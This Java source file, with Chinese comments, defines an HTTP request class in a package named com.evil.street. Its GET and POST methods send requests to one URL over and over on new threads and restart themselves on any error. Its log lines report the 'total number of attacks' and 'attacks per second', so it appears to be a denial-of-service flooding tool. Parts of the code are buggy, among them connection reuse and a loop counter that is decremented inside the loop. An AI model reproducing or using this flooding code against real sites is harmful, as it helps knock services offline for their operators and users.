package com.evil.street;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;

/**
 * @项目名： WebBrowser @包名： com.evil.webbrowser
 * 
 * @创建者: Noah.冯
 * @时间: 19:18 @描述： TODO
 */
public class HttpRequest {

	public static int sNum = Test.MAX_NUM;

	public static void GET(String url, HashMap<String, String> map, HttpRequestCallback callback) {
		long startTime = System.currentTimeMillis();
		new Thread(new Runnable() {
			public void run() {
				try {
					String httpUrl = url;
					if (map != null) {
						int position = 0;
						for (String key : map.keySet()) {
							if (position == 0) {
								httpUrl += "?";
							} else {
								httpUrl += "&";
							}
							httpUrl += key + "=" + map.get(key);
						}
					}
					HttpURLConnection httpURL = getHttpURL(httpUrl);
					httpURL.setConnectTimeout(5000);// 超时时间
					httpURL.setRequestMethod("GET");
					for (int i = 0; i < sNum; i++) {
						httpURL.connect();
						int responseCode = httpURL.getResponseCode();
						if (callback != null) {
							if (callback.response(responseCode)) {
								InputStream inputStream = httpURL.getInputStream();
								byte[] buf = new byte[8 * 1024];
								ByteArrayOutputStream out = new ByteArrayOutputStream();
								int lenght = -1;
								while ((lenght = inputStream.read(buf)) > 0) {
									out.write(buf, 0, lenght);
									out.flush();
								}
								String string = out.toString("UTF-8");
								callback.response(responseCode, string);
								out.close();
								inputStream.close();
							}
							callback.response(responseCode, url, i);
						}
						httpURL.disconnect();
						sNum--;
					}

					long entTime = System.currentTimeMillis();
					long allTime = entTime - startTime;
					Test.log(url + "  的总攻击次数：" + Test.MAX_NUM + "次，攻击所需时间：" + (allTime / 1000) + "秒,平均每秒攻击次数:"
							+ (Test.MAX_NUM / (allTime / 1000)) + "次");
				} catch (Exception e) {
					if (callback != null) {
						callback.failure(e.getMessage());
					} else {
						e.printStackTrace();
					}
					this.run();
				}
			}
		}).start();
	}

	public static void GET(String url, HttpRequestCallback callback) {
		GET(url, null, callback);
	}

	public static void GET(String url, HashMap<String, String> map) {
		GET(url, map, null);
	}

	public static void GET(String url) {
		GET(url, null, null);
	}

	public static void POST(String url, HashMap<String, String> map, HttpRequestCallback callback) {
		long startTime = System.currentTimeMillis();
		new Thread(new Runnable() {
			public void run() {
				try {
					HttpURLConnection httpURL = getHttpURL(url);
					httpURL.setRequestMethod("POST");
					httpURL.setConnectTimeout(3000); // 设置发起连接的等待时间，3s
					httpURL.setReadTimeout(30000); // 设置数据读取超时的时间，30s
					httpURL.setUseCaches(false); // 设置不使用缓存
					httpURL.setDoOutput(true);
					httpURL.setRequestMethod("POST");
					httpURL.setConnectTimeout(5000);// 超时时间
					httpURL.setRequestProperty("Connection", "Keep-Alive");
					httpURL.setRequestProperty("User-Agent",
							"Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.2.6)");
					if (map != null) {
						int position = 0;
						for (String key : map.keySet()) {
							httpURL.setRequestProperty(key, map.get(key));
						}
					}
					for (int i = 0; i < sNum; i++) {
						httpURL.connect();
						int responseCode = httpURL.getResponseCode();
						if (callback != null) {
							if (callback.response(responseCode)) {
								InputStream inputStream = httpURL.getInputStream();
								byte[] buf = new byte[8 * 1024];
								ByteArrayOutputStream out = new ByteArrayOutputStream();
								int lenght = -1;
								while ((lenght = inputStream.read(buf)) > 0) {
									out.write(buf, 0, lenght);
									out.flush();
								}
								String string = out.toString("UTF-8");
								callback.response(responseCode, string);
								out.close();
								inputStream.close();
							}
							callback.response(responseCode, url, i);
						}
						httpURL.disconnect();
					}

					long entTime = System.currentTimeMillis();
					long allTime = entTime - startTime;
					Test.log(url + "  的总攻击次数：" + Test.MAX_NUM + "次，攻击所需时间：" + (allTime / 1000) + "秒,平均每秒攻击次数:"
							+ (Test.MAX_NUM / (allTime / 1000)) + "次");
				} catch (Exception e) {
					if (callback != null) {
						callback.failure(e.getMessage());
					} else {
						e.printStackTrace();
					}
					this.run();
				}
			}
		}).start();
	}

	public static void POST(String url, HttpRequestCallback callback) {
		POST(url, null, callback);
	}

	public static void POST(String url, HashMap<String, String> map) {
		POST(url, map, null);
	}

	public static void POST(String url) {
		POST(url, null, null);
	}

	private static HttpURLConnection getHttpURL(String requestUrl) throws Exception {
		URL url = new URL(requestUrl);
		HttpURLConnection httpUrlConn = (HttpURLConnection) url.openConnection();
		return httpUrlConn;
	}
}
